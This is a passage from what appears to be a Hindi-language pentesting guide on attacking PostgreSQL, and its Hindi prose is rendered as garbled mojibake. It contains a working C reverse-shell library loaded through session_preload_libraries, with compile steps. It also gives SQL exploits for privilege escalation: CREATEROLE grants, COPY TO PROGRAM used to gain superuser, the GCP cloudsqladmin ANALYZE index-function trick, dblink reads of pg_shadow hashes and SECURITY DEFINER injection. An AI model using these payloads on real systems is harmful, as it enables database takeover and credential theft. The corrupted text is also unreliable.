3. `session_preload_libraries` рдорд╛рди рдореЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдирд╛рдо рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рдЬреИрд╕реЗ `session_preload_libraries = 'payload.so'`
4. `SELECT version()` рдХреНрд╡реЗрд░реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдореБрдЦ PostgreSQL рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
5. рд╕рд╣реА PostgreSQL dev рдкреИрдХреЗрдЬ рдХреЗ рд╕рд╛рде рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛрдб рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ рдЙрджрд╛рд╣рд░рдг рдХреЛрдб:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

рдХреЛрдб рд╕рдВрдХрд▓рд┐рдд рдХрд░рдирд╛:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. рдЪрд░рдг 2-3 рдореЗрдВ рдмрдирд╛рдП рдЧрдП рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг `postgresql.conf` рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдореВрд▓ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ
7. рдЪрд░рдг 5 рд╕реЗ `payload.so` рдХреЛ `/tmp` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ
8. рд╕рд░реНрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕рд░реНрд╡рд░ рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рдХреЗ рдпрд╛ `SELECT pg_reload_conf()` рдХреНрд╡реЗрд░реА рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдХреЗ рдлрд┐рд░ рд╕реЗ рд▓реЛрдб рдХрд░реЗрдВ
9. рдЕрдЧрд▓реА DB рдХрдиреЗрдХреНрд╢рди рдкрд░, рдЖрдкрдХреЛ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ**](https://www.postgresql.org/docs/13/sql-grant.html) рдХреЗ рдЕрдиреБрд╕рд╛рд░: _`CREATEROLE` рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рднреВрдорд┐рдХрд╛рдПрдБ рдХрд┐рд╕реА рднреА рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕рджрд╕реНрдпрддрд╛ **рджреЗ** рдпрд╛ **рд░рджреНрдж** рдХрд░ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ **рд╕реБрдкрд░рдпреВрдЬрд░** **рдирд╣реАрдВ** рд╣реИред_

рддреЛ, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЕрдиреНрдп **рднреВрдорд┐рдХрд╛рдУрдВ** (рдЬреЛ рд╕реБрдкрд░рдпреВрдЬрд░ рдирд╣реАрдВ рд╣реИрдВ) рдХреЛ рдЦреБрдж рдХреЛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдФрд░ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рджреЗ рд╕рдХрддреА рд╣реИрдВ:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modify Password

рдЗрд╕ рднреВрдорд┐рдХрд╛ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреНрдп **рдЧреИрд░-рд╕реБрдкрд░рдпреВрдЬрд░реНрд╕** рдХреЗ **рдкрд╛рд╕рд╡рд░реНрдб** рдХреЛ рднреА **рдмрджрд▓** рд╕рдХрддреЗ рд╣реИрдВ:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

рдпрд╣ рдХрд╛рдлреА рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ **рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ PostgreSQL рдореЗрдВ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **`SUPERUSER`** рднреВрдорд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
рдпрд╣ рдЖрдорддреМрд░ рдкрд░ **`pg_hba.conf`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЗ рдХрд╛рд░рдг рд╕рдВрднрд╡ рд╣реИ:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

[**рдЗрд╕ рд▓реЗрдЦ**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ **privesc** рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ Postgres GCP рдореЗрдВ ALTER TABLE рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдЬрдм рдЖрдк **рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдорд╛рд▓рд┐рдХ рдмрдирд╛рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдПрдХ **рддреНрд░реБрдЯрд┐** рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬреЛ рдЗрд╕реЗ рд░реЛрдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ GCP рдиреЗ рдЙрд╕ **рд╡рд┐рдХрд▓реНрдк рдХреЛ рдиреЙрди-рд╕реБрдкрд░рдпреВрдЬрд░ postgres рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ GCP рдореЗрдВ рджрд┐рдпрд╛:

<figure><img src="../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рд╡рд┐рдЪрд╛рд░ рдХреЛ рдЗрд╕ рддрдереНрдп рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рддреЗ рд╣реБрдП рдХрд┐ рдЬрдм **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) рдЖрджреЗрд╢ рдПрдХ **рд╕реВрдЪрдХрд╛рдВрдХ рдХрд╛рд░реНрдпрдХреНрд╖реЗрддреНрд░** рд╡рд╛рд▓реА **рддрд╛рд▓рд┐рдХрд╛** рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ **рдХрд╛рд░реНрдп** рдХреЛ **рддрд╛рд▓рд┐рдХрд╛** **рдорд╛рд▓рд┐рдХ рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЗ рд╕рд╛рде рдЖрджреЗрд╢ рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ **рдХреЙрд▓** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдХрд╛рд░реНрдп рдХреЗ рд╕рд╛рде рдПрдХ рд╕реВрдЪрдХрд╛рдВрдХ рдмрдирд╛рдирд╛ рдФрд░ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдкрд░ рдПрдХ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рдорд╛рд▓рд┐рдХрд╛рдирд╛ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдкрд░ ANALYZE рдЪрд▓рд╛рдирд╛ рдЬрд┐рд╕рдореЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХрд╛рд░реНрдп рд╣реЛрдЧрд╛ рдЬреЛ рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдорд╛рд▓рд┐рдХ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. рдПрдХ рдирдИ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдиреЗ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВред
2. рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдХреБрдЫ рдЕрдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рд╛рдордЧреНрд░реА рдбрд╛рд▓реЗрдВ рддрд╛рдХрд┐ рдЗрдВрдбреЗрдХреНрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
3. рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЗрдВрдбреЗрдХреНрд╕ рдлрд╝рдВрдХреНрд╢рди рд╡рд┐рдХрд╕рд┐рдд рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреЗрд▓реЛрдб рд╣реЛ, рдЬрд┐рд╕рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВред
4. рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЛ "cloudsqladmin" рдореЗрдВ ALTER рдХрд░реЗрдВ, рдЬреЛ GCP рдХреА рд╕реБрдкрд░рдпреВрдЬрд░ рднреВрдорд┐рдХрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ Cloud SQL рджреНрд╡рд╛рд░рд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдФрд░ рд░рдЦрд░рдЦрд╛рд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
5. рддрд╛рд▓рд┐рдХрд╛ рдкрд░ рдПрдХ ANALYZE рдСрдкрд░реЗрд╢рди рдХрд░реЗрдВред рдпрд╣ рдХреНрд░рд┐рдпрд╛ PostgreSQL рдЗрдВрдЬрди рдХреЛ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ "cloudsqladmin" рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддреА рд╣реИред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЗрдВрдбреЗрдХреНрд╕ рдлрд╝рдВрдХреНрд╢рди "cloudsqladmin" рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рд╢реЗрд▓ рдХрдорд╛рдВрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

PostgreSQL рдореЗрдВ, рдпрд╣ рдкреНрд░рд╡рд╛рд╣ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
рдлрд┐рд░, `shell_commands_results` рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╣реЛрдЧрд╛:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Local Login

рдХреБрдЫ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП postgresql рдЙрджрд╛рд╣рд░рдг рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрд┐рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ **`dblink` function** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ 127.0.0.1 рд╕реЗ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдХреНрд╡реЗрд░реА рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдлрдВрдХреНрд╢рди `dblink` рдХрд╛ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**ред рдпрджрд┐ рдпрд╣ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ, рд▓реЗрдХрд┐рди рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрд╛рд╣рд░реА IP рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреНрд╡реЗрд░реА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдореМрдЬреВрдж рд╣реИ:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **рдХрд╕реНрдЯрдо рдкрд░рд┐рднрд╛рд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде** SECURITY DEFINER

[**рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters рдПрдХ postgres рдЙрджрд╛рд╣рд░рдг рдХреЗ рдЕрдВрджрд░ privesc рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗ рдЬреЛ IBM рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЛрдВрдиреЗ **SECURITY DEFINER рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдкрд╛рдпрд╛**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
тАж
</code></pre>

рдЬреИрд╕рд╛ рдХрд┐ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://www.postgresql.org/docs/current/sql-createfunction.html), рдПрдХ рдлрд╝рдВрдХреНрд╢рди **SECURITY DEFINER рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ** **рдЙрд╕рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди **SQL Injection рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ** рдпрд╛ рдХреБрдЫ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рдирдХреЗ рдкреИрд░рд╛рдореАрдЯрд░ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИрдВ**, рддреЛ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **postgres рдХреЗ рдЕрдВрджрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдХреА рдкрдВрдХреНрддрд┐ 4 рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ **SECURITY DEFINER** рдзреНрд╡рдЬ рд╣реИред
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

**PL/pgSQL** рдПрдХ **рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рд╡рд╛рд▓реА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛** рд╣реИ рдЬреЛ SQL рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛рддреНрдордХ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдпрд╣ **рд▓реВрдк** рдФрд░ рдЕрдиреНрдп **рдирд┐рдпрдВрддреНрд░рдг рд╕рдВрд░рдЪрдирд╛рдУрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЙрдЬрд┐рдХ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **SQL рдХрдерди** рдФрд░ **рдЯреНрд░рд┐рдЧрд░реНрд╕** рдЙрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддреЗ рд╣реИрдВ рдЬреЛ **PL/pgSQL рднрд╛рд╖рд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдИ рдЧрдИ рд╣реИрдВред рдпрд╣ рдПрдХ рдЕрдзрд┐рдХ рд╡реНрдпрд╛рдкрдХ рдФрд░ рдмрд╣реБрдкрд░рдХрд╛рд░реА рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдбреЗрдЯрд╛рдмреЗрд╕ рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдПред\
**рдЖрдк рдЗрд╕ рднрд╛рд╖рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ PostgreSQL рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛ рд╕рдХреЗред**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Privesc by Overwriting Internal PostgreSQL Tables

{% hint style="info" %}
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рд╡реЗрдХреНрдЯрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕реАрдорд┐рдд SQLi рд╕рдВрджрд░реНрднреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕рднреА рдЪрд░рдгреЛрдВ рдХреЛ рдиреЗрд╕реНрдЯреЗрдб SELECT рдХрдердиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
{% endhint %}

рдпрджрд┐ рдЖрдк **PostgreSQL рд╕рд░реНрд╡рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝ рдФрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк **рдПрдХ рд╕реБрдкрд░рдпреВрдЬрд░** рдмрди рд╕рдХрддреЗ рд╣реИрдВ PostgreSQL рдХреЗ рдСрди-рдбрд┐рд╕реНрдХ рдлрд╝рд╛рдЗрд▓рдиреЛрдб рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ, рдЬреЛ рдЖрдВрддрд░рд┐рдХ `pg_authid` рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

